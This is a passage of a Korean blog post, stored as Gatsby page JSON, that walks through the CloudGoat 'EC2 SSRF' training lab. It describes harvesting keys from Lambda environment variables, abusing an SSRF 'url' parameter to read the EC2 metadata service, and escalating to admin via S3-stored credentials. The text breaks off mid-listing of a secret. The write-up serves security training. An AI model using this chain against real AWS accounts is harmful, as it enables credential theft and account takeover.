{
    "componentChunkName": "component---src-templates-blog-template-js",
    "path": "/cloud-service-vuln-6/",
    "result": {"data":{"cur":{"id":"fd3424cb-3a5d-55af-a909-b515988cc73d","html":"<h1 id=\"클라우드-서비스-취약점-분석-6\" style=\"position:relative;\"><a href=\"#%ED%81%B4%EB%9D%BC%EC%9A%B0%EB%93%9C-%EC%84%9C%EB%B9%84%EC%8A%A4-%EC%B7%A8%EC%95%BD%EC%A0%90-%EB%B6%84%EC%84%9D-6\" aria-label=\"클라우드 서비스 취약점 분석 6 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>클라우드 서비스 취약점 분석 6</h1>\n<h1 id=\"scenario-5-ec2-ssrf\" style=\"position:relative;\"><a href=\"#scenario-5-ec2-ssrf\" aria-label=\"scenario 5 ec2 ssrf permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[Scenario 5]: EC2 SSRF</h1>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre class=\"language-bash\"><code class=\"language-bash\">Size: Medium\nDifficulty: Moderate\nCommand: $ ./cloudgoat.py create ec2_ssrf</code></pre></div>\n<h2 id=\"시나리오-개요\" style=\"position:relative;\"><a href=\"#%EC%8B%9C%EB%82%98%EB%A6%AC%EC%98%A4-%EA%B0%9C%EC%9A%94\" aria-label=\"시나리오 개요 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>시나리오 개요</h2>\n<h3 id=\"자원\" style=\"position:relative;\"><a href=\"#%EC%9E%90%EC%9B%90\" aria-label=\"자원 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>자원</h3>\n<ul>\n<li>VPC (EC2)</li>\n<li>Lambda Function</li>\n<li>1 S3 Bucket</li>\n</ul>\n<h3 id=\"취약점\" style=\"position:relative;\"><a href=\"#%EC%B7%A8%EC%95%BD%EC%A0%90\" aria-label=\"취약점 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>취약점</h3>\n<ul>\n<li>Solus IAM 사용자</li>\n<li>Lambda 함수 읽기 전용 권한</li>\n<li>Lambda 환경 변수안에 하드코딩된 Wrex Access key</li>\n<li>하드코딩된 민감한 데이터 정보</li>\n<li>웹 애플리케이션의 SSRF 취약점으로 인한 AWS 메타데이터 API를 통해서 다른 Credential 접근 가능 여부</li>\n<li>Admin Credential 정보가 S3 Bucket 내에 하드 코딩되어 저장</li>\n</ul>\n<h3 id=\"목표\" style=\"position:relative;\"><a href=\"#%EB%AA%A9%ED%91%9C\" aria-label=\"목표 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>목표</h3>\n<ul>\n<li><code class=\"language-text\">cg-lambda-/cloud goat id/</code> 람다 함수를 실행합니다.</li>\n<li>Solus IAM 사용자로 시작해서 Lambda 함수를 읽을 수 있는 권한을 발견하였습니다.</li>\n<li>SSRF에 취약한 웹 애플리케이션을 실행하는 EC2 인스턴스로 유도합니다.</li>\n<li>취약한 앱을 Exploit하고 EC2 Metadata Service에서 Key를 획득한 후 공격자는 Lambda 함수를 호출하고 시나리오를 완료할 수 있는 Key를 획득함으로써 권한을 탈취를 합니다.</li>\n</ul>\n<h3 id=\"exploit-흐름도\" style=\"position:relative;\"><a href=\"#exploit-%ED%9D%90%EB%A6%84%EB%8F%84\" aria-label=\"exploit 흐름도 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>exploit 흐름도</h3>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 56.666666666666664%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAYAAAB/Ca1DAAAACXBIWXMAAAsTAAALEwEAmpwYAAADYUlEQVQozz2SbUxTZxTHD6Jt7y3KHCVe7/Pc3ra0UiogIO3tpS0T1BZKGdxBILXQdW7JkpEZN4wjkoEN5WVWhdJiYtwSE5NNui++ZsliYqzLTJYte8n2YX6bbNGEZIGtrUN7+ywXl306OR/OL7//yR9MJnOZbW99h21vQxPseaNEcAdGBXfXDcHd9ZnD1ZX2tEnpbun1dKA3nBZbu5cFl39ZcAeuCu7ATYer6wgAgMls0yLEUhhjFXAYU1ZbnXGPgWff/Y2Avcl9WnAe/kFo8X5ldxzIeFo77vdKwUyPFPpadHc8cIjeB4Lz4D3B2f6dvdn5ZvDsBvCY0WK9gUKIVQNnqNIAQGnDOwmtZ/7HmparhPf8QrbbZwhtnyJ68wmCKiI5PRx6tEOcJpVijFiEKKlujBJ908lnBnHk2+pqR5+WqaA0nN6kBovQQxNCoH585cDwFULGbxVJ6/w/y/7o+mRoUSZHLxTy4ZRMOmP5i90zuUtDSZlElgrPwqlCIZySiwPz8ppr5BszAGyxNPo0ULvPQyt/6B+52xyb/eKni8lrD9+fyJx1fLDW3jObXZTmcvHAdG6hfXx1oG1s5eCrM9l4z2x2tncuG5fmsmc6omvHa7yT5bptoObNdWpA7G4N4s2UoQTUALAVANQnCAH/VPZUaFHORZbk34cW5XxnLH9OfDvD950rPh5KFtfDqeJqMEGK/lh+YqpIoPaVt7YjllEDxliDEUshg4WyCi7K6fMrxtu8k38elT56erk/nr/Ud+bpZe/pv97bH/lSL47+ccw38eTDQPTJmOfk41PCsYftSlxDTQuNMX4BRAhRGHOU0SrSaAuo9N4LFQPnn38fTsn54aS8OpyU/x5cKP7KSPfaSlqWP9H5b19jum+nd/qu34D9V4YhQ6DS5NJuAhFCm0BlcnojZbE5FMPS1+bWRwfPb9wJzm/cDCU27gzEs5N6b1K3w5U00kLCSAsLBlpcqnqpebzS8DKoEWei/jfEGCuL0iPK6hws+5QQ8EXXj4cShUeR1POfgwuFlcB0dlr5cWcDqAIApX6ArRJAqbUcVCxnpPCLYm8aqv+z1KDN+FjDIUaDm4bK6H1j5bsOfayr6r/F1g5+vqtGPKLVMTy129hIMXwdxfD1FMtZFJhyp6RU/QsMJCoiwHYKywAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"31.png\"\n        title=\"31.png\"\n        src=\"/static/2a0f2b90f16f2cf7664ca2f7b323a795/37523/31.png\"\n        srcset=\"/static/2a0f2b90f16f2cf7664ca2f7b323a795/e9ff0/31.png 180w,\n/static/2a0f2b90f16f2cf7664ca2f7b323a795/f21e7/31.png 360w,\n/static/2a0f2b90f16f2cf7664ca2f7b323a795/37523/31.png 720w,\n/static/2a0f2b90f16f2cf7664ca2f7b323a795/302a4/31.png 1080w,\n/static/2a0f2b90f16f2cf7664ca2f7b323a795/07a9c/31.png 1440w,\n/static/2a0f2b90f16f2cf7664ca2f7b323a795/4435f/31.png 2479w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<h3 id=\"시나리오-환경설정\" style=\"position:relative;\"><a href=\"#%EC%8B%9C%EB%82%98%EB%A6%AC%EC%98%A4-%ED%99%98%EA%B2%BD%EC%84%A4%EC%A0%95\" aria-label=\"시나리오 환경설정 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>시나리오 환경설정</h3>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 37.77777777777778%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAICAYAAAD5nd/tAAAACXBIWXMAAAsTAAALEwEAmpwYAAAB0klEQVQoz1WSbW+aUBSA77TaNzvBNzoRQRCKgNJSUbQFZbVWl23N2ixLti/7/3/iWSRdsn14cnNzbs45zzlXhDcprjfDtG9oKxatjkVHGdKQVOSmgap5WE5Es21ycqZwftGlXGkiRA0h3iOE/Eadd2UJ8fL6i/tsyyrfF2w2n8l2r/hPP4imKav1ns32K49Pz0V8nX8izbYE4wWLNGH7zWG6UugabarHHUS23mHZY1TNode/Qtdd2kZAxYpRLk20vku7Y9DTbPp9B91wi/cDc8KVP2SaS0yWdXRboXqiIFx/XugoH2z0wRi176EbAbrm0jfGdLURXdVF0QJkdcyZPECI8zcuEEL6R7mOOMyvczlk5M+5jdeEN/dMZzlhlHL9xsiLccMMO3pE6XlUjpvFvEpHMuWqTLkiUarIxV2Yw2saLQNzGBJMFoz8GUG4xBhe43oxXpAwsEL8ccLd/RbPnxXLOyyoctLiqCoVlP8m1PSAC0njcB66tZxbfH+OYwZYdoTjxoW6M4oZ+UnxGxqtAbW6Sqnc+k9ZHJR3+2ei2wVptiH/uGfzsCPZvdDIvxPPU9b5UxG/Sx/IVo/MkxXRdFEUjRKbL79P2f+sES17nJ6p/AHJr+Phzu/hiAAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"0\"\n        title=\"0\"\n        src=\"/static/d801f8e70d81855a1dbee0d30756c74c/37523/0.png\"\n        srcset=\"/static/d801f8e70d81855a1dbee0d30756c74c/e9ff0/0.png 180w,\n/static/d801f8e70d81855a1dbee0d30756c74c/f21e7/0.png 360w,\n/static/d801f8e70d81855a1dbee0d30756c74c/37523/0.png 720w,\n/static/d801f8e70d81855a1dbee0d30756c74c/27b7a/0.png 804w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<h3 id=\"exploit-시나리오-흐름도\" style=\"position:relative;\"><a href=\"#exploit-%EC%8B%9C%EB%82%98%EB%A6%AC%EC%98%A4-%ED%9D%90%EB%A6%84%EB%8F%84\" aria-label=\"exploit 시나리오 흐름도 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>exploit 시나리오 흐름도</h3>\n<ol>\n<li>IAM 에 포함된 Solus 계정을 토대로 AWS 환경을 분석하고 계정에서 Lambda 함수 리스트들이 있음을 확인하였습니다.</li>\n<li>Lambda 함수 내에서 공격자는 다른 사용자즉 IAM 사용자 Wrex에 속한 AWS Access key를 찾습니다.</li>\n<li>IAM Wrex 사용자 로 작동하는 공겨자는 SSRF 취약점에 취약한 웹 애플리케이션을 실행하는 EC2 인스턴스를 발견합니다.</li>\n<li>GET 메서드로 요청을 보낼때 <code class=\"language-text\">url</code> 파라미터를 통해 SSRF 취약점을 트리거하여 공격자는 EC2 Metadata service에서 AWS 키를 탈취합니다.</li>\n<li>공격자는 EC2 인스턴스의 키를 사용하여 권한이 더 높은 사용자인 Shepard에 대한 다른 AWS Credential 가 포함된 Private S3 Bucket을 발견하였습니다.</li>\n<li>Full Privilege으로 Shepeard인척 공격자는 원래의 Lambda 함수를 호출하여 시나리오가 완료됩니다</li>\n</ol>\n<div class=\"gatsby-highlight\" data-language=\"jsx\"><pre class=\"language-jsx\"><code class=\"language-jsx\"><span class=\"token constant\">IAM</span> <span class=\"token operator\">:</span> <span class=\"token function\">Solus</span> <span class=\"token punctuation\">(</span>Read Only Key Access<span class=\"token punctuation\">)</span>\n\nLambda <span class=\"token keyword\">function</span> list <span class=\"token operator\">-</span><span class=\"token operator\">></span> Secret key\n\nWrex <span class=\"token operator\">&lt;</span><span class=\"token operator\">-</span></code></pre></div>\n<h2 id=\"exploit-시나리오\" style=\"position:relative;\"><a href=\"#exploit-%EC%8B%9C%EB%82%98%EB%A6%AC%EC%98%A4\" aria-label=\"exploit 시나리오 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Exploit 시나리오</h2>\n<h3 id=\"solus-key-정보를-읽기전용을-접근\" style=\"position:relative;\"><a href=\"#solus-key-%EC%A0%95%EB%B3%B4%EB%A5%BC-%EC%9D%BD%EA%B8%B0%EC%A0%84%EC%9A%A9%EC%9D%84-%EC%A0%91%EA%B7%BC\" aria-label=\"solus key 정보를 읽기전용을 접근 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Solus key 정보를 읽기전용을 접근</h3>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 37.77777777777778%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAICAYAAAD5nd/tAAAACXBIWXMAAAsTAAALEwEAmpwYAAABv0lEQVQoz02S227aQBRFJ0BTghKCAySBAGPA+DJjjy84NpBAuDxUavvW1/7/b6wK09vD1pbO1lnaRzNi83bED1KiuMCEGXa6pZWe8N0I14uZOxqtU5ROSdISpUryd5uvP5vsvlsMRxNuWgNu2y9c1TuIkdT0nxwW3hI5jbBnhqkTM1+kjKVGzgy9scEaBNQaFrV65+KNTqUz5I/OczGaKM7KiwMqXKHNmiTbEWdbXH9JGL/hJkfkIue62UNctX/DrP/8n8RwFPA0WFCsThXQxBtUkGPSLY6bEYQlRXmo8sGLT7szptboIUQHISxE7dJO1O4v7rgJcqopVkfieI1efjA27yTJGl/l6KjApBtCs2IsA/qPc55enpH+HcOpReuuT+O6y+ebR+qfHhAmXuH6abWoVMbMbGj7awI/ITQlXpAibYW0A+ypYjD0sN1nzKZJkFk89IbctJ6xurKCio/DN7J8x2t5YPn6QbY6ESz36LDgbfuF/fGSn7Nzy4kMcVWEFzlY/S7Xze7l1Kv2xQOVMV9EVRPfNYx0yW24Yz4NsGeKifSr77PwYnSU4/mvZGuH04978r3F42BEvdH9+yi/AJ9y31R5GIyHAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"1\"\n        title=\"1\"\n        src=\"/static/f68b2b48d6f5941ae953cf6507a51eff/37523/1.png\"\n        srcset=\"/static/f68b2b48d6f5941ae953cf6507a51eff/e9ff0/1.png 180w,\n/static/f68b2b48d6f5941ae953cf6507a51eff/f21e7/1.png 360w,\n/static/f68b2b48d6f5941ae953cf6507a51eff/37523/1.png 720w,\n/static/f68b2b48d6f5941ae953cf6507a51eff/a2b88/1.png 908w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>해당 클라우드 환경을 분석하면서 <code class=\"language-text\">start.txt</code> 문서로 AWS Credential 정보를 읽기 전용으로 해당 정보를 확인할 수 있습니다.</li>\n<li>AWS Credential 을 사용하여 어떤 AWS 작업을 할 수 있는지 확인하기 위해 IAM 리스트를 열거하여 정보를 확인하였습니다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 42.22222222222223%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAICAYAAAD5nd/tAAAACXBIWXMAAAsTAAALEwEAmpwYAAABrUlEQVQozyWRS2+bUBCFaVq1aZtiYxMImLcB8zDmZQcIGIdEVhS1UdSq2+6qbvv/V6ea6eLqSvM4880Z4fH8DW03oap73LYn9N0JzvQDxekrhn5C1z9wvGknHO9HvP5y8PO3jz/NGX+D73ixB7hJDT8oMZMsCMP4jCi5heNlMO0U2moD3Yyh6iEsZ4uVGUM3Is4ZVgzTjmG5CQwzhmWl/Cjv+QVkZQ0hK3pkeY+8HOCHFUTJxEJ28GVmQLkJcPlJxbW6xnxh40pcQVZ8LGSXaZaKB2npQJybEOcG1wrt3Rn1YUJeHUG0JBpGe6ajQYaV8O+uc9huhiy/Q5K1THWjh0xmezuGePN2DqHa3yPZtgg2FTdSQZw23FxUIzemWYtNcuA41dLQNOsgKx6uRB0zyWT6i3cShH58ZsJd0ePQPDJdXh6xDkocmgeoWoBueGLRsh7ZmqI6suCHjwqvyULCZwgXMyI8cXEQ1SxKq4bxno9AjbTyrhj4cPH2PyHlKUYr0xHJR6JkD6nAYQ9caKuIk3QtMl03YkhLmympWdVCKFrAjzyjGK1KQvS/v7zGP5vd51P8LLYfAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"2\"\n        title=\"2\"\n        src=\"/static/23b70d53f44d3cd1846e298d9f2f597c/37523/2.png\"\n        srcset=\"/static/23b70d53f44d3cd1846e298d9f2f597c/e9ff0/2.png 180w,\n/static/23b70d53f44d3cd1846e298d9f2f597c/f21e7/2.png 360w,\n/static/23b70d53f44d3cd1846e298d9f2f597c/37523/2.png 720w,\n/static/23b70d53f44d3cd1846e298d9f2f597c/3a737/2.png 897w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>해당 리스트를 통해서 Lambda 서비스를 이용할 수있는 벡터가 존재하는 것을 확인할 수 있습니다. 이에 관해서 좀더 분석을 하기로 했습니다.</li>\n</ul>\n<h3 id=\"lambda-환경-변수-데이터-확인\" style=\"position:relative;\"><a href=\"#lambda-%ED%99%98%EA%B2%BD-%EB%B3%80%EC%88%98-%EB%8D%B0%EC%9D%B4%ED%84%B0-%ED%99%95%EC%9D%B8\" aria-label=\"lambda 환경 변수 데이터 확인 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Lambda 환경 변수 데이터 확인</h3>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 59.44444444444444%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAMCAYAAABiDJ37AAAACXBIWXMAAAsTAAALEwEAmpwYAAABuUlEQVQoz5WS6XKiQBRG2y2OCCKCIIi4sa9CAJM4SZyZ93+mb6qvVVacibP8+OoW3cXpc/s2y4oXJNkz/LCGF1SwnRj2OoFlh9jscjibFIOhhk5vim5f+WtYUb2iqt8JWj6+oazfUTVn5IevtB7GDYYj/d+BHBRnT/CCR4KGcYswabH3Svp2/er/DKv6jLr9hqw4kdElZyT5xdi0w7s/f3YIi5IjeNygItMgaih7v7zaMSaBdWWw7gSsc0mnP/0Uzrhdc/yBNH/BoXxD3X4nwyw/kbU630EQTYyEBQTRgiSvMJYsdHsKGONw+QrjlfFN1djA2rqwtns4XgjHC7BLIqw8H2s/gpdlcLMEXp4iLAssVi4mqgVRWUCQjVtD3m5aPCNKGyTFEWX9iqI6IS5apIcnmCsfI0nHcKxhKGoYjlV8ETUIEx1j2aC9GyC/fN7axylH8eVed/sD+g/qtbV7uWl5brgwTA+avsPSibGwfHrUY8mkgfQGClUO7j/MqP5p4kySbZjLgKD64gI2LB+CZEJRN5jOHKjzLUWSl7TWG8zuvksC8kymK0xna8iKQ3akT0/l93xs8VfgT+c2L1gitvQ9AAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"3\"\n        title=\"3\"\n        src=\"/static/fcd67411f58be4230dbb56177c6920f4/37523/3.png\"\n        srcset=\"/static/fcd67411f58be4230dbb56177c6920f4/e9ff0/3.png 180w,\n/static/fcd67411f58be4230dbb56177c6920f4/f21e7/3.png 360w,\n/static/fcd67411f58be4230dbb56177c6920f4/37523/3.png 720w,\n/static/fcd67411f58be4230dbb56177c6920f4/59000/3.png 917w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>Pacu를 통해서 lambda service 에서 <code class=\"language-text\">cg-lambda-id</code> 호출하는 값이 있는 지 확인한 결과 ENV 값으로 EC2_ACCESS_KEY_ID, SECRET_KEY_ID 가 있는 것을 확인할 수 있었습니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"jsx\"><pre class=\"language-jsx\"><code class=\"language-jsx\"><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">]</span> <span class=\"token function\">Secret</span> <span class=\"token punctuation\">(</span><span class=\"token constant\">ENV</span><span class=\"token punctuation\">)</span><span class=\"token operator\">:</span> <span class=\"token constant\">EC2_ACCESS_KEY_ID</span><span class=\"token operator\">=</span> <span class=\"token 